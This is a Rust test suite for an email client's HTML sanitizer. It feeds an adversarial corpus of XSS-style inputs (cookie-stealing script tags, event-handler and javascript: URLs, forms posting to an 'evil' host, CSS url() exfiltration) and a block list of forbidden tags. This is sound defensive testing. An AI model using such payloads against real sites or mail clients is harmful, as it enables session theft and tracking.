//! Adversarial corpus for the HTML sanitizer (ADR-0007).
//!
//! Each case asserts both what must survive and what must never appear.
//! The invariants below hold for *every* case regardless of its specific
//! expectations, so they are checked centrally in [`assert_invariants`].
#![allow(clippy::unwrap_used)]

use axomail_security::{sanitize_message_html, sanitize_message_html_bytes};

/// Substrings that must never appear in sanitized output, for any input.
const FORBIDDEN: &[&str] = &[
    "<script",
    "</script",
    "onerror=",
    "onload=",
    "onclick=",
    "onmouseover=",
    "javascript:",
    "vbscript:",
    "<form",
    "<input",
    "<iframe",
    "<object",
    "<embed",
    "<applet",
    "<meta",
    "<base",
    "<link",
    "<svg",
    "<style",
    " style=",
    "srcset=",
];

/// Universal invariants: no forbidden substring survives, case-insensitively.
fn assert_invariants(input: &str, out: &str) {
    let lower = out.to_ascii_lowercase();
    for needle in FORBIDDEN {
        assert!(
            !lower.contains(needle),
            "forbidden {needle:?} survived for input {input:?} -> {out:?}"
        );
    }
}

#[test]
fn adversarial_corpus_table() {
    struct Case {
        name: &'static str,
        input: &'static str,
        /// Substrings that must be present in the output.
        must_contain: &'static [&'static str],
        /// Substrings that must be absent from the output.
        must_not_contain: &'static [&'static str],
        remote_blocked: usize,
        had_active_content: bool,
    }

    let cases = [
        Case {
            name: "script element removed with content",
            input: "<p>hi</p><script>steal(document.cookie)</script>",
            must_contain: &["hi"],
            must_not_contain: &["steal", "document.cookie"],
            remote_blocked: 0,
            had_active_content: true,
        },
        Case {
            name: "img onerror handler stripped",
            input: "<img src=\"cid:logo\" onerror=\"alert(1)\">",
            must_contain: &["cid:logo"],
            must_not_contain: &["alert", "onerror"],
            remote_blocked: 0,
            had_active_content: true,
        },
        Case {
            name: "javascript href dropped",
            input: "<a href=\"javascript:alert(1)\">x</a>",
            must_contain: &["x"],
            must_not_contain: &["alert", "javascript"],
            remote_blocked: 0,
            had_active_content: false,
        },
        Case {
            name: "svg onload removed entirely",
            input: "<svg onload=\"alert(1)\"><circle r=\"10\"/></svg>after",
            must_contain: &["after"],
            must_not_contain: &["alert", "circle", "onload"],
            remote_blocked: 0,
            had_active_content: true,
        },
        Case {
            name: "form and input stripped, text kept",
            input: "<form action=\"https://evil\">name<input name=\"pw\"></form>",
            must_contain: &["name"],
            must_not_contain: &["<form", "<input", "evil", "action"],
            remote_blocked: 0,
            had_active_content: true,
        },
        Case {
            name: "iframe removed with content",
            input: "<iframe src=\"https://evil\">fallback</iframe>body",
            must_contain: &["body"],
            must_not_contain: &["<iframe", "fallback", "evil"],
            remote_blocked: 0,
            had_active_content: true,
        },
        Case {
            name: "object removed with content",
            input: "<object data=\"https://evil.swf\">obj</object>tail",
            must_contain: &["tail"],
            must_not_contain: &["<object", "evil", "obj"],
            remote_blocked: 0,
            had_active_content: true,
        },
        Case {
            name: "meta refresh removed",
            input: "<meta http-equiv=\"refresh\" content=\"0;url=https://evil\">text",
            must_contain: &["text"],
            must_not_contain: &["<meta", "refresh", "evil"],
            remote_blocked: 0,
            had_active_content: false,
        },
        Case {
            name: "base tag removed",
            input: "<base href=\"https://evil/\"><a href=\"https://ok/\">link</a>",
            must_contain: &["link", "https://ok/"],
            must_not_contain: &["<base"],
            remote_blocked: 0,
            had_active_content: false,
        },
        Case {
            name: "css url exfiltration in style attr stripped",
            input: "<div style=\"background:url(https://evil/leak?c=1)\">seen</div>",
            must_contain: &["seen"],
            must_not_contain: &["url(", "evil", "background", "style"],
            remote_blocked: 0,
            had_active_content: false,
        },
        Case {
            name: "nested mismatched tags are balanced",
            input: "<b><i>bold</b> still</i> plain",
            must_contain: &["bold", "still", "plain"],
            must_not_contain: &["<script"],
            remote_blocked: 0,
            had_active_content: false,
        },
        Case {
            name: "cid image preserved",
            input: "<img src=\"cid:abc123@mail\" alt=\"logo\">",
            must_contain: &["cid:abc123@mail", "logo"],
            must_not_contain: &[],
            remote_blocked: 0,
            had_active_content: false,
        },
        Case {
            name: "https image blocked and counted",
            input: "<img src=\"https://tracker.example/pixel.gif\" alt=\"a\">",
            must_contain: &["<img", "a"],
            must_not_contain: &["https://tracker", "pixel.gif"],
            remote_blocked: 1,
            had_active_content: false,
        },
        Case {
            name: "data image rejected at the scheme gate (not counted)",
            input: "<img src=\"data:image/png;base64,AAAABBBB\">",
            must_contain: &["<img"],
            must_not_contain: &["data:image", "base64"],
            remote_blocked: 0,
            had_active_content: false,
        },
        Case {
            name: "srcset blocked and counted",
            input: "<img src=\"cid:x\" srcset=\"https://a/1.png 1x, https://a/2.png 2x\">",
            must_contain: &["cid:x"],
            must_not_contain: &["srcset", "https://a"],
            remote_blocked: 1,
            had_active_content: false,
        },
        Case {
            name: "mailto link kept with rel",
            input: "<a href=\"mailto:ada@example.org\">mail</a>",
            must_contain: &["mailto:ada@example.org", "noopener noreferrer", "mail"],
            must_not_contain: &[],
            remote_blocked: 0,
            had_active_content: false,
        },
        Case {
            name: "entity-encoded javascript url dropped",
            input: "<a href=\"&#106;avascript:alert(1)\">click</a>",
            must_contain: &["click"],
            must_not_contain: &["javascript", "alert", "avascript:"],
            remote_blocked: 0,
            had_active_content: false,
        },
        Case {
            name: "vbscript url dropped",
            input: "<a href=\"vbscript:msgbox(1)\">y</a>",
            must_contain: &["y"],
            must_not_contain: &["vbscript", "msgbox"],
            remote_blocked: 0,
            had_active_content: false,
        },
        Case {
            name: "http link kept for display",
            input: "<a href=\"http://example.org/path\">site</a>",
            must_contain: &["http://example.org/path", "site", "noopener noreferrer"],
            must_not_contain: &[],
            remote_blocked: 0,
            had_active_content: false,
        },
        Case {
            name: "relative link denied (no trustworthy base)",
            input: "<a href=\"/local/path\">rel</a>",
            must_contain: &["rel"],
            must_not_contain: &["/local/path", "href="],
            remote_blocked: 0,
            had_active_content: false,
        },
    ];

    for case in cases {
        let result = sanitize_message_html(case.input);
        assert_invariants(case.input, &result.html);
        for needle in case.must_contain {
            assert!(
                result.html.contains(needle),
                "[{}] expected {needle:?} in {:?}",
                case.name,
                result.html
            );
        }
        for needle in case.must_not_contain {
            assert!(
                !result.html.contains(needle),
                "[{}] unexpected {needle:?} in {:?}",
                case.name,
                result.html
            );
        }
        assert_eq!(
            result.remote_blocked, case.remote_blocked,
            "[{}] remote_blocked mismatch in {:?}",
            case.name, result.html
        );
        assert_eq!(
            result.had_active_content, case.had_active_content,
            "[{}] had_active_content mismatch",
            case.name
        );
    }
}

#[test]
fn remote_fetches_are_counted_and_data_is_dropped_at_the_gate() {
    let input = concat!(
        "<img src=\"https://a/1.png\">",
        "<img src=\"cid:keep\">",
        "<img src=\"https://a/2.png\">",
        "<img src=\"data:image/gif;base64,QQ\">",
    );
    let result = sanitize_message_html(input);
    // Two remote http(s) fetches suppressed; the `data:` image is rejected by
    // the scheme allowlist (not a fetch, not tallied); the `cid:` is preserved
    // for a later resolver.
    assert_eq!(result.remote_blocked, 2);
    assert!(result.html.contains("cid:keep"));
    assert!(!result.html.contains("data:image"));
    assert_invariants(input, &result.html);
}

#[test]
fn empty_and_plaintext_inputs_are_stable() {
    let empty = sanitize_message_html("");
    assert_eq!(empty.html, "");
    assert_eq!(empty.remote_blocked, 0);
    assert!(!empty.had_active_content);

    let text = sanitize_message_html("just some plain text & a < b");
    assert!(text.html.contains("just some plain text"));
    assert!(!text.had_active_content);
}

#[test]
fn extremely_long_input_is_handled() {
    // ~2 MiB of benign markup interleaved with hostile fragments.
    let unit = "<p>hello <b>world</b></p><script>bad()</script>";
    let input = unit.repeat(45_000);
    let result = sanitize_message_html(&input);
    assert_invariants(&input, &result.html);
    assert!(result.had_active_content);
    assert!(result.html.contains("hello"));
    assert!(!result.html.contains("bad()"));
}

#[test]
fn invalid_utf8_is_handled_lossily_at_the_boundary() {
    // Lone continuation bytes, a truncated multi-byte sequence, NULs, and a
    // hostile tag spliced between garbage bytes.
    let mut bytes: Vec<u8> = vec![0xff, 0xfe, 0x00, 0x80, 0x81];
    bytes.extend_from_slice(b"<script>evil()</script>");
    bytes.extend_from_slice(&[0xc3, 0x28, 0xed, 0xa0, 0x80]);
    bytes.extend_from_slice(b"<p>ok</p>");
    bytes.extend_from_slice(&[0xf0, 0x28, 0x8c, 0x28]);

    let result = sanitize_message_html_bytes(&bytes);
    assert!(result.html.contains("ok"));
    assert!(!result.html.contains("evil()"));
    assert!(result.had_active_content);
    // The lossy string form is what the sanitizer actually processed.
    let lossy = String::from_utf8_lossy(&bytes);
    assert_invariants(&lossy, &result.html);
}

#[test]
fn fuzzish_garbage_bytes_never_panic() {
    // Deterministic pseudo-random byte soup: the sanitizer must always
    // return without panicking, whatever the bytes are.
    let mut state: u32 = 0x1234_5678;
    for _ in 0..256 {
        let mut buf = Vec::with_capacity(512);
        for _ in 0..512 {
            state = state.wrapping_mul(1_664_525).wrapping_add(1_013_904_223);
            buf.push((state >> 16) as u8);
        }
        // Must not panic; result is intentionally unconstrained.
        let _ = sanitize_message_html_bytes(&buf);
    }
}

#[test]
fn determinism_same_input_same_output() {
    let input = "<p>x</p><img src=\"https://a/p.png\"><a href=\"javascript:1\">y</a>";
    let first = sanitize_message_html(input);
    let second = sanitize_message_html(input);
    assert_eq!(first, second);
}
